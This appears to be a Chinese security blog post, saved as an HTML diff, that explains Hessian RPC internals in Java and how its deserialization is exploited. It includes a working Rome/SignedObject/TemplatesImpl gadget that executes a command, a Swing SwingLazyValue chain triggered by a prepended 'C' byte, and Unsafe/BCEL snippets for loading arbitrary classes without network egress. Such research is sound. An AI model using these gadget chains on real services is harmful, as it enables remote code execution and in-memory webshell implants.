@@ -1,0 +1,459 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=HandheldFriendly content="True"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Cache-Control content="no-transform"><meta http-equiv=Cache-Control content="no-siteapp"><meta name=generator content="Hugo 0.140.0"><link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon/favicon-16x16.png><link rel=manifest href=/favicon/site.webmanifest><link rel=mask-icon href=/favicon/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>Hessian Deserialization - zrquan</title>
+<meta name=author content="[4shen0ne]"><meta name=description content="A minimal Hugo theme with nice theme color."><meta name=keywords content="hessian,deserialize"><meta property="og:title" content="Hessian Deserialization"><meta name=twitter:title content="Hessian Deserialization"><meta property="og:type" content="article"><meta property="og:url" content="https://zrquan.github.io/posts/hessian-deserialization/"><meta property="og:description" content="Hessian 是一个二进制 Web 协议的实现，由 caucho 公司主导开发，其目的是实现一个轻量级、跨语言、自描述（不依赖外部定义）的二进制通信协议"><meta name=twitter:description content="Hessian 是一个二进制 Web 协议的实现，由 caucho 公司主导开发，其目的是实现一个轻量级、跨语言、自描述（不依赖外部定义）的二进制通信协议"><meta property="og:image" content="https://zrquan.github.io/img/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zrquan.github.io/img/og.png"><meta property="article:published_time" content="2024-12-18T00:00:00+08:00"><meta property="article:modified_time" content="2024-12-18T00:00:00+08:00"><style>@media(prefers-color-scheme:dark){body[data-theme=auto] img{filter:brightness(60%)}}body[data-theme=dark] img{filter:brightness(60%)}</style><link rel=stylesheet href=https://zrquan.github.io/assets/css/fuji.min.4c44b7b7f176c7ea2e7d3a85a954d45c0d3e801e81eacbad84c7f9575b51e65dc11b59ff1a372389e8b4e0821d6bbb5a668fe9c3e77af9418acb79126a035a1f.css integrity="sha512-TES3t/F2x+oufTqFqVTUXA0+gB6B6suthMf5V1tR5l3BG1n/Gjcjiei04IIda7taZo/pw+d6+UGKy3kSagNaHw=="></head><body data-theme=auto data-theme-auto=false><script data-cfasync=false>var fujiThemeData=localStorage.getItem("fuji_data-theme");fujiThemeData?fujiThemeData!=="auto"&&document.body.setAttribute("data-theme",fujiThemeData==="dark"?"dark":"light"):localStorage.setItem("fuji_data-theme","auto")</script><header></header><main><div class="container-lg clearfix"><div class="col-12 col-md-9 float-left content"><article><h1 class="post-item post-title"><a href=https://zrquan.github.io/posts/hessian-deserialization/>Hessian Deserialization</a></h1><div class="post-item post-meta"><span><i class="iconfont icon-today-sharp"></i>&nbsp;2024-12-18</span>
+<span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;4445 words</span>
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href=/tags/hessian>hessian</a>&nbsp;<a href=/tags/deserialize>deserialize</a>&nbsp;</span></div><div class="post-content markdown-body"><p>Hessian 是一个二进制 Web 协议的实现，由 caucho 公司主导开发，其目的是实现一个轻量级、跨语言、自描述（不依赖外部定义）的二进制通信协议</p><h2 id=hello-hessian>Hello Hessian</h2><p>Hessian 基于 HTTP 进行数据传输，一般会像常规的 Web 服务一样提供一个 API 被客户端调用。以 Servlet 项目为例，和常规 Web 服务一样绑定路由，通过 Tomcat 部署</p><h3 id=示例-servlet>示例：Servlet</h3><p>和普通的 Servlet 配置差不多，但是需要继承 HessianServlet</p><p><a id=code-snippet--hello></a></p><pre><code class=language-java>public class Hello extends HessianServlet implements Greeting {
+    @Override
+    public String sayHello(String name) {
+        return &quot;Hello, &quot; + name;
+    }
+}
+</code></pre><pre><code class=language-xml>&lt;web-app&gt;
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;greeting&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;org.example.Hello&lt;/servlet-class&gt;
+    &lt;/servlet&gt;
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;greeting&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+&lt;/web-app&gt;
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 1:</span>
+web.xml</div><p>打包成 war 之后直接用 tomcat 部署即可</p><pre><code class=language-shell>docker run -it --rm \
+  -e 'JPDA_ADDRESS=*:8000' \
+  -e JPDA_TRANSPORT=dt_socket \
+  -p 8888:8080 \
+  -p 9000:8000 \
+  -v ./hessian.war:/usr/local/tomcat/webapps/hessian.war \
+  tomcat:9.0 \
+  /usr/local/tomcat/bin/catalina.sh jpda run
+</code></pre><p>客户端使用 Hessian 的工厂类构建一个动态代理对象，实现对远程对象的方法调用</p><p><a id=code-snippet--client></a></p><pre><code class=language-java>public class Client {
+    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException {
+        String url = &quot;http://localhost:8888/hessian/hello&quot;;
+
+        HessianProxyFactory factory = new HessianProxyFactory();
+        Greeting greeting = (Greeting) factory.create(Greeting.class, url);
+
+        System.out.println(&quot;Hessian server say: &quot; + greeting.sayHello(&quot;client&quot;));
+    }
+}
+</code></pre><div class=src-block-caption><span class=src-block-number><a href=#code-snippet--client>Code Snippet 2</a>:</span>
+Hessian Client</div><p>Hessian 通常是基于 HTTP 协议进行数据传输的，使用的是 POST 方法</p><figure><img src=/ox-hugo/_20241210_104811screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241210_104811screenshot.png></figure><pre><code class=language-hexdump>63 02 00 6d 00 08 73 61 79 48 65 6c 6c 6f 53 00 06 63 6c 69 65 6e 74 7a
+c..m..sayHelloS..clientz
+</code></pre><h3 id=示例-springboot>示例：SpringBoot</h3><p>在 SpringBoot 中可以用 <code>org.springframework.remoting.caucho.HessianServiceExporter</code> 来注册服务，注意
+remoting 模块在最新版本中默认是不提供的，建议使用低版本进行测试</p><p>通过注解进行配置还是比较简单的，demo 代码可以参考<a href=https://github.com/eugenp/tutorials/tree/master/spring-remoting-modules/remoting-hessian-burlap target=_blank>这里</a></p><pre><code class=language-java>@Configuration
+@ComponentScan
+@EnableAutoConfiguration
+public class Application {
+    @Autowired
+    private Hello greeting;  // 注意给 Hello 类添加 @Service 注解
+
+    public static void main(String[] args) {
+        SpringApplication.run(Application.class, args);
+    }
+
+    @Bean(name = &quot;/hello&quot;)
+    public RemoteExporter helloService() {
+        HessianServiceExporter exporter = new HessianServiceExporter();
+        exporter.setService(greeting);
+        exporter.setServiceInterface(Greeting.class);
+        return exporter;
+    }
+}
+</code></pre><p>Client 代码和前文一样，访问 <code>:8080/hello</code> 即可调用 Hessian 服务</p><h2 id=远程调用过程>远程调用过程</h2><h3 id=hessianservlet>HessianServlet</h3><p>HessianServlet 是 HTTPServlet 的子类，所以我们重点关注两个方法：</p><ol><li>init：负责初始化 Servlet 对象</li><li>service：负责处理和响应 HTTP 请求</li></ol><p>在 init 方法中，主要是初始化一些成员变量，比如我们定义的 <a href=#code-snippet--hello>Hello</a> 对象和它的类型信息；还有 skeleton 对象，用来处理来自客户端的数据，完成远程方法调用</p><figure><img src=/ox-hugo/_20241210_113710screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241210_113710screenshot.png></figure><p>service 方法是整个 RPC 处理过程的入口点，我们从这里开始探索 Hessian 的服务调用实现逻辑</p><ol><li>首先会检查是不是 POST 请求，如果不是的话会直接返回 500 错误码</li><li>接着用 ServiceContext 类保存一些上下文对象（request、response 等等）</li><li>初始化序列化工厂对象 SerializerFactory</li><li>再进入 <code>com.caucho.hessian.server.HessianSkeleton#invoke(InputStream, OutputStream, SerializerFactory)</code> 方法</li></ol><h3 id=hessianskeleton>HessianSkeleton</h3><p>HessianSkeleton 是 AbstractSkeleton 的子类，其功能类似于动态代理，将实际的服务对象进行封装，提供给客户端调用，在调用过程中就涉及到二进制数据的序列化和反序列化</p><p>AbstractSkeleton 初始化时会从服务对象的接口（类）中获取所有方法并保存在 <code>_methodMap</code> 中</p><pre><code class=language-java>protected AbstractSkeleton(Class apiClass)
+{
+  _apiClass = apiClass;
+
+  Method []methodList = apiClass.getMethods();
+
+  for (int i = 0; i &lt; methodList.length; i++) {
+    Method method = methodList[i];
+
+    if (_methodMap.get(method.getName()) == null)
+      _methodMap.put(method.getName(), methodList[i]);
+
+    Class []param = method.getParameterTypes();
+    String mangledName = method.getName() + &quot;__&quot; + param.length;
+    _methodMap.put(mangledName, methodList[i]);
+
+    _methodMap.put(mangleName(method, false), methodList[i]);
+  }
+}
+</code></pre><p>每个方法会在 <code>_methodMap</code> 中生成三组键值对，key 分别为：</p><pre><code class=language-text>1. 方法名
+2. 方法名__参数个数
+3. 方法名_参数1类型_参数2类型
+</code></pre><p>服务对象则保存在私有属性 <code>HessianSkeleton#_service</code> 中</p><p>客户端调用服务时调用 <code>HessianSkeleton#invoke</code> ，会读取二进制数据的头部判断协议的版本，比如前文的数据以 <code>63 02</code> 开头，服务端则会用 HessianInput 进行反序列化，然后用 Hessian2Output 对返回数据进行序列化（CALL_1_REPLY_2）</p><pre><code class=language-java>public HeaderType readHeader(InputStream is)
+  throws IOException
+{
+  int code = is.read();
+
+  int major = is.read();
+  int minor = is.read();
+
+  switch (code) {
+  case -1:
+    throw new IOException(&quot;Unexpected end of file for Hessian message&quot;);
+
+  case 'c':
+    if (major &gt;= 2)
+      return HeaderType.CALL_1_REPLY_2;
+    else
+      return HeaderType.CALL_1_REPLY_1;
+  case 'r':
+    return HeaderType.REPLY_1;
+
+  case 'H':
+    return HeaderType.HESSIAN_2;
+
+  default:
+    throw new IOException((char) code + &quot; 0x&quot; + Integer.toHexString(code) + &quot; is an unknown Hessian message code.&quot;);
+  }
+}
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 3:</span>
+com.caucho.hessian.io.HessianInputFactory#readHeader</div><pre><code class=language-java>switch (header) {
+case CALL_1_REPLY_1:
+  in = _hessianFactory.createHessianInput(is);
+  out = _hessianFactory.createHessianOutput(os);
+  break;
+
+case CALL_1_REPLY_2:
+  in = _hessianFactory.createHessianInput(is);
+  out = _hessianFactory.createHessian2Output(os);
+  break;
+
+case HESSIAN_2:
+  in = _hessianFactory.createHessian2Input(is);
+  in.readCall();
+  out = _hessianFactory.createHessian2Output(os);
+  break;
+
+default:
+  throw new IllegalStateException(header + &quot; is an unknown Hessian call&quot;);
+}
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 4:</span>
+com.caucho.hessian.server.HessianSkeleton#invoke</div><p>设置好输入输出流之后，根据前文提到的 <code>_methodMap</code> 找到要执行的方法，通过 <code>HessianSkeleton#_service</code> 进行反射调用，再将调用结果返回给客户端</p><figure><img src=/ox-hugo/_20241210_160147screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241210_160147screenshot.png></figure><h3 id=协议版本>协议版本</h3><p>我们现在知道，即使 Hessian 协议已经迭代到 2.0 版本，仍然可以和 1.0 版本混用，默认情况下使用
+CALL_1_REPLY_2，即客户端发送 1.0 协议数据，服务端返回 2.0 协议数据</p><figure><img src=/ox-hugo/_20241212_152518screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241212_152518screenshot.png></figure><p>想要客户端发送 2.0 协议数据需要显式设置</p><pre><code class=language-java>HessianProxyFactory factory = new HessianProxyFactory();
+factory.setHessian2Request(true);
+</code></pre><h2 id=序列化过程>序列化过程</h2><p>Hessian 定义了 AbstractHessianInput/AbstractHessianOutput 两个抽象类，用来提供序列化数据的读取和写入功能。从前文我们可以知道，根据协议版本不同，提供了 Hessian/Hessian2/Burlap 等几种不同的具体实现</p><p>我们先通过 <a href=#code-snippet--client>Client</a> 示例简单看看序列化的过程</p><p>首先要使用 HessianProxyFactory 来创建一个动态代理对象来代理远程的服务对象，当调用任意方法时实际执行的是 <code>com.caucho.hessian.client.HessianProxy#invoke</code> ，发送请求时通过 <code>HessianOutput#writeObject</code> 来写入序列化数据</p><pre><code class=language-text>writeObject:315, HessianOutput (com.caucho.hessian.io)
+call:132, HessianOutput (com.caucho.hessian.io)
+sendRequest:293, HessianProxy (com.caucho.hessian.client)
+invoke:171, HessianProxy (com.caucho.hessian.client)
+sayHello:-1, $Proxy0 (com.sun.proxy)
+main:13, Client
+</code></pre><p>根据不同的序列化数据类型，会从工厂类中获取对应的序列化器实现，通常是 BasicSerializer 实现</p><pre><code class=language-java>public void writeObject(Object object)
+  throws IOException
+{
+  if (object == null) {
+    writeNull();
+    return;
+  }
+
+  Serializer serializer;
+
+  serializer = _serializerFactory.getSerializer(object.getClass());
+
+  serializer.writeObject(object, this);
+}
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 5:</span>
+com.caucho.hessian.io.HessianOutput#writeObject</div><details><summary><code>ContextSerializerFactory#_serializerClassMap</code></summary><div class=details><figure><img src=/ox-hugo/_20241210_174729screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241210_174729screenshot.png></figure></div></details><p>在开始进行数据序列化时，会调用 <code>com.caucho.hessian.io.AbstractHessianOutput#writeObjectBegin</code> ，在 1.0
+版本时会把所有数据都写在一个 Map 容器里面，Hessian2Output 则重写了该方法，根据类型写入其描述信息</p><pre><code class=language-java>/**
+ * Writes the object header to the stream (for Hessian 2.0), or a
+ * Map for Hessian 1.0.  Object writers will call
+ * ...
+ */
+public int writeObjectBegin(String type)
+  throws IOException
+{
+  writeMapBegin(type);
+  return -2;
+}
+</code></pre><h3 id=serializable-和-transient>Serializable 和 transient</h3><p>逐步调试 <code>HessianOutput#writeObject</code> 的过程中，我们可以注意到两个比较关键的判断逻辑。在工厂类获取序列化器时，会判断目标类有没有实现 Serializable 接口，这很合理，但条件是这样的：</p><pre><code class=language-java>if (! Serializable.class.isAssignableFrom(cl)
+    &amp;&amp; ! _isAllowNonSerializable) {
+  throw new IllegalStateException(&quot;Serialized class &quot; + cl.getName() + &quot; must implement java.io.Serializable&quot;);
+}
+</code></pre><p>也就是还有一个 <code>_isAllowNonSerializable</code> 属性可以让没有实现 Serializable 接口的类进行序列化</p><p>继续调试，工厂类默认获取的序列化器是 UnsafeSerializer，它会跳过所有被 transient 和 static 修饰的成员变量</p><pre><code class=language-java>if (Modifier.isTransient(field.getModifiers())
+    || Modifier.isStatic(field.getModifiers())) {
+  continue;
+}
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 6:</span>
+com.caucho.hessian.io.UnsafeSerializer#introspect</div><h2 id=反序列化过程>反序列化过程</h2><p>反序列化过程和 AbstractHessianInput 的子类密切相关，入口方法和原生反序列化一样（名字一样）都是
+readObject，以 HessianInput 为例，在 readObject 方法中会根据 tag 判断数据的类型，然后使用对应的
+Deserializer 去处理。由于 Hessian1.0 会把序列化数据都放在一个 Map 中，所以会像下图一样通过 readMap
+处理：</p><figure><img src=/ox-hugo/_20241211_155749screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241211_155749screenshot.png></figure><p>在 readMap 中会将数据进行反序列化，然后将对象放到 HashMap 或者 TreeMap 的键值对里</p><pre><code class=language-java>public Object readMap(AbstractHessianInput in)
+  throws IOException
+{
+  Map map;
+
+  if (_type == null)
+    map = new HashMap();
+  else if (_type.equals(Map.class))
+    map = new HashMap();
+  else if (_type.equals(SortedMap.class))
+    map = new TreeMap();
+  else {
+    try {
+      map = (Map) _ctor.newInstance();
+    } catch (Exception e) {
+      throw new IOExceptionWrapper(e);
+    }
+  }
+
+  in.addRef(map);
+
+  while (! in.isEnd()) {
+    map.put(in.readObject(), in.readObject());
+  }
+
+  in.readEnd();
+
+  return map;
+}
+</code></pre><p>看到这里我们应该意识到 Hessian 反序列化漏洞的入口在哪了，虽然在反序列过程中不会像原生反序列化一样触发 readObject 方法，也不会像 FastJSON 一样调用 getter/setter，但这个 readMap 方法中的 <code>map.put</code> 操作成了漏网之鱼</p><p>众所周知，HashMap 在执行 put 操作时会调用 key 的 hashCode 和 equals 方法，这在很多现有的链中被利用到；而 TreeMap 在执行 put 操作时也会调用 key 的 compareTo 方法</p><p>如果是 Hessian2.0 的序列化数据，数据流的 tag 是 <code>C</code> ，最后会根据类型描述信息由
+<code>sun.misc.Unsafe#allocateInstance</code> 方法进行反序列化对象的初始化，这个方法是一个 native 方法，没有办法进行利用</p><pre><code class=language-text>instantiate:306, UnsafeDeserializer (com.caucho.hessian.io)
+readObject:148, UnsafeDeserializer (com.caucho.hessian.io)
+readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io)
+readObject:2140, Hessian2Input (com.caucho.hessian.io)
+readObject:2124, Hessian2Input (com.caucho.hessian.io)
+readObject:1677, Hessian2Input (com.caucho.hessian.io)
+invoke:296, HessianSkeleton (com.caucho.hessian.server)
+invoke:198, HessianSkeleton (com.caucho.hessian.server)
+invoke:399, HessianServlet (com.caucho.hessian.server)
+service:379, HessianServlet (com.caucho.hessian.server)
+</code></pre><h2 id=利用链分析>利用链分析</h2><p>根据以上反序列化过程的分析，我们可以总结出 Hessian 的利用链的特征：</p><ol><li>入口方法是 hashCode/equals/compareTo 其中之一</li><li>利用类可以不实现 Serializable 接口，但是 transient 成员变量不能利用</li><li>利用类的 readObject 不会自动触发，除非在利用链上显式调用（二次反序列化）</li></ol><h3 id=rome>Rome</h3><p>Rome 是一个用于 RSS 和 Atom 订阅的 Java 框架，在 marshalsec 中就用它的 ToStringBean 和 EqualsBean
+等类构造出了 Hessian 利用链</p><p>EqualsBean 在 hashCode 中可以执行任意对象的 toString 方法</p><pre><code class=language-java>public class EqualsBean implements Serializable {
+    public int hashCode() {
+        return beanHashCode();
+    }
+    // ...
+    public int beanHashCode() {
+        return obj.toString().hashCode();
+    }
+}
+</code></pre><p>而 <code>ToStringBean#toString</code> 可以调用他封装类的全部无参 getter 方法，那么可以用
+<code>JdbcRowSetImpl#getDatabaseMetaData</code> 进行 JNDI 注入</p><figure><img src=/ox-hugo/_20241211_162700screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241211_162700screenshot.png></figure><p>在不出网的情况下还可以利用 <code>java.security.SignedObject#getObject</code> 触发原生反序列化链（二次反序列化）</p><figure><img src=/ox-hugo/_20241211_162929screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241211_162929screenshot.png></figure><pre><code class=language-text>getObject:179, SignedObject (java.security)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:497, Method (java.lang.reflect)
+toString:158, ToStringBean (com.rometools.rome.feed.impl)
+toString:129, ToStringBean (com.rometools.rome.feed.impl)
+beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
+hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
+hash:338, HashMap (java.util)
+put:611, HashMap (java.util)
+readMap:114, MapDeserializer (com.caucho.hessian.io)
+readMap:538, SerializerFactory (com.caucho.hessian.io)
+readObject:1160, HessianInput (com.caucho.hessian.io)
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 1:</span>
+SignedObject 链调用栈</div><details><summary>利用 TemplatesImpl 原生反序列化利用链执行命令</summary><div class=details><pre><code class=language-java>public class SignedObjectGadget {
+    public static void main(String[] args) throws Exception {
+        byte[] code = getTemplates();
+        byte[][] codes = {code};
+        TemplatesImpl templates = new TemplatesImpl();
+        setValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        setValue(templates, &quot;_name&quot;, &quot;Aiwin&quot;);
+        setValue(templates, &quot;_class&quot;, null);
+        setValue(templates, &quot;_bytecodes&quot;, codes);
+        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
+        EqualsBean equalsBean = new EqualsBean(String.class, &quot;aiwin&quot;);
+        HashMap hashMap = new HashMap();
+        hashMap.put(equalsBean, &quot;aaa&quot;);
+        setValue(equalsBean, &quot;beanClass&quot;, ToStringBean.class);
+        setValue(equalsBean, &quot;obj&quot;, toStringBean);
+
+        //SignedObject
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);
+        kpg.initialize(1024);
+        KeyPair kp = kpg.generateKeyPair();
+        SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));
+        ToStringBean toStringBean_sign = new ToStringBean(SignedObject.class, signedObject);
+        EqualsBean equalsBean_sign = new EqualsBean(String.class, &quot;aiwin&quot;);
+        HashMap hashMap_sign = new HashMap();
+        hashMap_sign.put(equalsBean_sign, &quot;aaa&quot;);
+        setValue(equalsBean_sign, &quot;beanClass&quot;, ToStringBean.class);
+        setValue(equalsBean_sign, &quot;obj&quot;, toStringBean_sign);
+        String result = Hessian_serialize(hashMap_sign);
+        Hessian_unserialize(result);
+    }
+
+    public static void setValue(Object obj, String name, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static byte[] getTemplates() throws IOException, CannotCompileException, NotFoundException {
+        ClassPool classPool = ClassPool.getDefault();
+        CtClass ctClass = classPool.makeClass(&quot;Test&quot;);
+        ctClass.setSuperclass(classPool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));
+        String block = &quot;Runtime.getRuntime().exec(\&quot;kcalc\&quot;);&quot;;
+        ctClass.makeClassInitializer().insertBefore(block);
+        return ctClass.toBytecode();
+    }
+
+    public static String Hessian_serialize(Object object) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
+        hessianOutput.writeObject(object);
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+
+    public static void Hessian_unserialize(String obj) throws IOException {
+        byte[] code = Base64.getDecoder().decode(obj);
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(code);
+        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
+        hessianInput.readObject();
+    }
+}
+</code></pre></div></details><figure><img src=/ox-hugo/_20241211_175539screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241211_175539screenshot.png></figure><h3 id=swing>Swing</h3><p>这是一条 JDK 原生的反序列化链，这条链的 sink 点在 <code>sun.swing.SwingLazyValue#createValue</code> 方法中</p><p><a id=code-snippet--SwingLazyValue></a></p><pre><code class=language-java>public Object createValue(UIDefaults var1) {
+    try {
+        ReflectUtil.checkPackageAccess(this.className);
+        Class var2 = Class.forName(this.className, true, (ClassLoader)null);
+        if (this.methodName != null) {
+            Class[] var6 = this.getClassArray(this.args);
+            Method var7 = var2.getMethod(this.methodName, var6);
+            this.makeAccessible(var7);
+            // 注意 var2 是一个 Class 对象，所以我们只能利用类方法
+            return var7.invoke(var2, this.args);
+        } else {
+            Class[] var3 = this.getClassArray(this.args);
+            Constructor var4 = var2.getConstructor(var3);
+            this.makeAccessible(var4);
+            return var4.newInstance(this.args);
+        }
+    } catch (Exception var5) {
+        return null;
+    }
+}
+</code></pre><p>这个方法有两个利用点，我们可以通过指定 methodName 来反射调用任意方法，也可以将 methodName 置空来触发一个类的初始化操作。其实这个类在 Xstream 的 <a href=https://x-stream.github.io/CVE-2021-21346.html target=_blank>CVE-2021-21346</a> 就被利用过，当时的 gadget 为：</p><pre><code class=language-text>Rdn$RdnEntry#compareTo-&gt;
+  XString#equal-&gt;
+    MultiUIDefaults#toString-&gt;
+      UIDefaults#get-&gt;
+        UIDefaults#getFromHashTable-&gt;
+          UIDefaults$LazyValue#createValue-&gt;
+            SwingLazyValue#createValue-&gt;
+              InitialContext#doLookup()
+</code></pre><p>由于 MultiUIDefaults 不是 public 类，这个 gadget 无法复用到 Hessian 中，我们还需要找到一个入口触发
+<code>UIDefaults#get</code></p><p>找到代替品 <code>javax.activation.MimeTypeParameterList#toString</code> ，它会执行 parameters 成员变量的 get 方法</p><pre><code class=language-java>public String toString() {
+    StringBuffer buffer = new StringBuffer();
+    buffer.ensureCapacity(this.parameters.size() * 16);
+    Enumeration keys = this.parameters.keys();
+
+    while(keys.hasMoreElements()) {
+        String key = (String)keys.nextElement();
+        buffer.append(&quot;; &quot;);
+        buffer.append(key);
+        buffer.append('=');
+        buffer.append(quote((String)this.parameters.get(key)));
+    }
+
+    return buffer.toString();
+}
+</code></pre><p>至于 toString 方法，可以利用 <code>Hessian2Input#expect</code> 触发，这是一个用来打印类型错误信息的方法，Hessian
+在反序列化时需要从数据流读取标志字节（tag）来判断接下来的数据是什么类型，以此来保证使用正确的方法还原对象，比如之前我们看到过 M 代表 Map 类型的对象，会调用 readMap 方法处理</p><p>当读取到的 tag 和预期不符时，会调用 <code>Hessian2Input#expect</code> 来输出错误信息，这时会将剩下的数据用
+readObject 方法进行反序列化，然后和字符串拼接生成错误信息，这时候会隐式执行对象的 toString 方法</p><pre><code class=language-java>Object obj = readObject();
+if (obj != null) {
+  return error(&quot;expected &quot; + expect
+               + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 0xff)
+               + &quot; &quot; + obj.getClass().getName() + &quot; (&quot; + obj + &quot;)&quot;
+               + &quot;\n  &quot; + context + &quot;&quot;);
+</code></pre><p>那么怎么触发 <code>Hessian2Input#expect</code> 呢？经过调试可以发现，在反序列化 MimeTypeParameterList 或者其他自定义对象时，会调用 readObjectDefinition 获取类名信息，这时就会使用 readString 来获取类名字符串</p><figure><img src=/ox-hugo/_20241213_153000screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241213_153000screenshot.png></figure><figure><img src=/ox-hugo/_20241213_153054screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241213_153054screenshot.png></figure><p>很容易想到，我们在序列化数据中，将开头代表自定义类型的标志 C 多写入一个，那么在 readString 方法中读取到的仍然是完整的 MimeTypeParameterList 对象，这时候就会因为 tag 不是代表字符串而进入 expect 方法，将 MimeTypeParameterList 反序列化，并触发它的 toString 方法</p><pre><code class=language-java>ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+Hessian2Output out = new Hessian2Output(byteArrayOutputStream);
+out.getSerializerFactory().setAllowNonSerializable(true);
+out.writeObject(object);
+out.flushBuffer();
+
+byte[] origin = byteArrayOutputStream.toByteArray();
+byte[] payload = new byte[origin.length + 1];
+System.arraycopy(new byte[]{'C'}, 0, payload, 0, 1);
+System.arraycopy(origin, 0, payload, 1, origin.length);
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 7:</span>
+在序列化数据开头添加 C (byte)</div><pre><code class=language-text>exec:347, Runtime (java.lang)
+...
+invoke:275, MethodUtil (sun.reflect.misc)
+...
+invoke:497, Method (java.lang.reflect) [1]
+createValue:73, SwingLazyValue (sun.swing)
+getFromHashtable:216, UIDefaults (javax.swing)
+get:161, UIDefaults (javax.swing)
+toString:253, MimeTypeParameterList (javax.activation)
+valueOf:2994, String (java.lang)
+append:131, StringBuilder (java.lang)
+expect:2880, Hessian2Input (com.caucho.hessian.io)
+readString:1398, Hessian2Input (com.caucho.hessian.io)
+readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
+readObject:2122, Hessian2Input (com.caucho.hessian.io)
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 2:</span>
+调用栈</div><h4 id=不出网利用>不出网利用</h4><p>通过反射调用任意方法可以做到 RCE，但在无法出网的情境下，单纯的 RCE 也难以有效利用。如果可以借助
+<a href=#code-snippet--SwingLazyValue><code>SwingLazyValue#createValue</code></a> 初始化任意类，那么就可以写入内存马</p><ul><li><ol><li>Unsafe</li></ol><p><code>sun.misc.Unsafe#defineClass</code> 可以通过字节数组动态定义一个类， <code>SwingLazyValue#createValue</code> 又可以利用来加载和初始化一个类，结合两者我们就能够实现任意类初始化，以此执行任意代码</p><p>整个利用过程需要触发两次反序列化漏洞，第一次通过反射调用 defineClass 定义任意类，假设为 Exploit</p><pre><code class=language-java>Method invoke = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);
+Method defineClass = Unsafe.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);
+Field f = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+f.setAccessible(true);
+Object unsafe = f.get(null);
+Object[] args = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{&quot;exp&quot;, payload, 0, payload.length, null, null}}};  // payload 为 Exploit 类字节数组
+SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;, &quot;invoke&quot;, args);
+</code></pre><p>成功定义 Exploit 类后加载并初始化，需要将 methodName 设置为 null</p><pre><code class=language-java>SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;Exploit&quot;, null, new Object[0]);
+</code></pre></li></ul><ul><li><ol start=2><li>BCEL</li></ol><p>BCEL（Byte Code Engineering Library）是一个由 Apache Commons 提供的库，用于分析、创建和修改 Java 字节码，而 <code>com.sun.org.apache.bcel.internal.util.JavaWrapper#_main</code> 可以从 BCEL 格式的对象字符串中动态构建对象</p><pre><code class=language-java>SwingLazyValue slz = new SwingLazyValue(&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;, &quot;_main&quot;, new Object[]{new String[]{payload}});  // payload 是恶意类的 BCEL 字符串
+</code></pre><details><summary>调用栈</summary><div class=details><pre><code class=language-text>_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
